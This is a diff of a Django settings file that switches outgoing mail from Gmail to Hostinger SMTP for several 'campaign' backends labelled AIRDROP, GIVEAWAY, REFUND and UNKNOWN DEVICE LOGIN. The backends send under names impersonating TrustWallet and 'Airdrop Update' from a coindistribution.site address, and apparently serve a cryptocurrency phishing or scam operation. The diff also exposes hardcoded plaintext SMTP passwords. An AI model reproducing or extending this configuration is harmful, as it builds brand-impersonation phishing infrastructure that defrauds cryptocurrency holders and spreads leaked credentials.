@@ -147,8 +147,8 @@ DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
 
 # Email Configuration
 EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
-EMAIL_HOST = 'smtp.gmail.com'
-EMAIL_PORT = 587
+EMAIL_HOST = 'smtp.hostinger.com'
+EMAIL_PORT = 465
 EMAIL_USE_TLS = True
 EMAIL_USE_SSL = False
 EMAIL_HOST_USER = 'cointracker.llc@gmail.com'
@@ -158,37 +158,37 @@ EMAIL_TIMEOUT = 60
 
 CAMPAIGN_EMAIL_BACKENDS = {
     'AIRDROP': {
-        'EMAIL_HOST': 'smtp.gmail.com',
-        'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'Airdrop Update decentralizedxchange@gmail.com',
+        'EMAIL_HOST': 'smtp.hostinger.com',
+        'EMAIL_PORT': 465,
+        'EMAIL_HOST_USER': 'Airdrop Update support@coindistribution.site',
         'EMAIL_HOST_PASSWORD': 'dyuc bpbt zwqg jefe',
-        'EMAIL_USE_TLS': True,
-        'EMAIL_USE_SSL': False,
+        'EMAIL_USE_TLS': False,
+        'EMAIL_USE_SSL': True,
         'EMAIL_TIMEOUT': 60
     },
     'GIVEAWAY': {
-        'EMAIL_HOST': 'smtp.gmail.com',
-        'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'TrustWallet decentralizedxchange@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'qguy isqs vfcw ylqx',
-        'EMAIL_USE_TLS': True,
-        'EMAIL_USE_SSL': False,
+        'EMAIL_HOST': 'smtp.hostinger.com',
+        'EMAIL_PORT': 465,
+        'EMAIL_HOST_USER': 'TrustWallet support@coindistribution.site',
+        'EMAIL_HOST_PASSWORD': 'Arinze123.',
+        'EMAIL_USE_TLS': False,
+        'EMAIL_USE_SSL': True,
         'EMAIL_TIMEOUT': 60
     },
     'REFUND': {
-        'EMAIL_HOST': 'smtp.gmail.com',
-        'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'TrustWallet decentralizedxchange@gmail.com', # Replace with your Gmail address
-        'EMAIL_HOST_PASSWORD': 'qguy isqs vfcw ylqx',
-        'EMAIL_USE_TLS': True,
-        'EMAIL_USE_SSL': False,
+        'EMAIL_HOST': 'smtp.hostinger.com',
+        'EMAIL_PORT': 465,
+        'EMAIL_HOST_USER': 'TrustWallet support@coindistribution.site', # Replace with your Gmail address
+        'EMAIL_HOST_PASSWORD': 'Arinze123.',
+        'EMAIL_USE_TLS': False,
+        'EMAIL_USE_SSL': True,
         'EMAIL_TIMEOUT': 60
     },
     'UNKNOWN DEVICE LOGIN': {
-        'EMAIL_HOST': 'smtp.gmail.com',
+        'EMAIL_HOST': 'smtp.hostinger.com',
         'EMAIL_PORT': 465,
-        'EMAIL_HOST_USER': 'decentralizedxchange@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'qguy isqs vfcw ylqx',
+        'EMAIL_HOST_USER': 'support@coindistribution.site',
+        'EMAIL_HOST_PASSWORD': 'Arinze123.',
         'EMAIL_USE_TLS': False,
         'EMAIL_USE_SSL': True,
         'EMAIL_TIMEOUT': 60
